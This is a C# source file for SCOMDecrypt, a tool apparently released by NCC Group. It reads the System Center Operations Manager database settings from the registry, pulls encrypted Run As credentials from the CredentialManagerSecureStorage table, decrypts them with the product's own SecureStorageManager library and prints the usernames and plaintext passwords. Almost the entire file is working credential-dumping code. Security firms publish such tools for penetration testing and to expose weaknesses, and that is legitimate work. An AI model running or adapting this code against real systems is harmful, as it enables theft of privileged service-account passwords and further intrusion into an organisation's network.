/*
Released as open source by NCC Group Plc - http://www.nccgroup.com/

Developed by Richard Warren, richard dot warren at nccgroup dot trust

https://www.github.com/nccgroup/SCOMDecrypt

Released under AGPL see LICENSE for more information
*/

using System;
using Microsoft.Win32;
using System.Data.SqlClient;
using System.Reflection;

namespace SCOMDecrypt
{

    class Program
    {
        static void GetData(dynamic scom)
        {
            RegistryKey dbKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\System Center\\2010\\Common\\Database", true);
            object dbServerName = dbKey.GetValue("DatabaseServerName");
            object dbName = dbKey.GetValue("DatabaseName");

            SqlConnection conn = new SqlConnection();
            string connectionString = String.Format("Server={0};Database={1};Trusted_Connection=True;", dbServerName, dbName);
            string queryString = "SELECT UserName, Data FROM dbo.CredentialManagerSecureStorage;";
            using (SqlConnection connection = new SqlConnection(
                       connectionString))
            {
                SqlCommand command = new SqlCommand(queryString, connection);
                connection.Open();
                SqlDataReader reader = command.ExecuteReader();
                try
                {
                    while (reader.Read())
                    {
                        if (!reader.IsDBNull(reader.GetOrdinal("Data")) && !reader.IsDBNull(reader.GetOrdinal("UserName")))
                        {
                            string username = (string)reader[0];
                            byte[] pwBytes = (byte[])reader[1];
                            Console.WriteLine("[+] {0}:{1}", username, System.Text.Encoding.UTF8.GetString((scom.Decrypt(pwBytes))));
                        }
                    }
                }
                finally
                {
                    reader.Close();
                }
            }
        }

        public void Test(dynamic scom, string inStr)
        {
            if (!scom.IsProvisioned())
            {
                Console.WriteLine("Server not provisioned, attempting to provision.");
                scom.Provision();
            }
            Console.WriteLine("[*] Provisioned?.. {0}", scom.IsProvisioned());
            byte[] encBytes = scom.Encrypt(System.Text.Encoding.UTF8.GetBytes(inStr));
            Console.WriteLine("[+] Encrypted: {0}", BitConverter.ToString(encBytes).Replace("-", string.Empty)); 
            byte[] decBytes = scom.Decrypt(encBytes);
            Console.WriteLine("[+] Decrypted: {0}", System.Text.Encoding.UTF8.GetString(decBytes));
        }

        static void Main(string[] args)
        {
            Assembly asm = Assembly.LoadFrom(@"C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll");
            var type = asm.GetType("Microsoft.EnterpriseManagement.Security.SecureStorageManager");
            dynamic scom = Activator.CreateInstance(type);
            scom.Initialize();
            GetData(scom);
        }
    }
}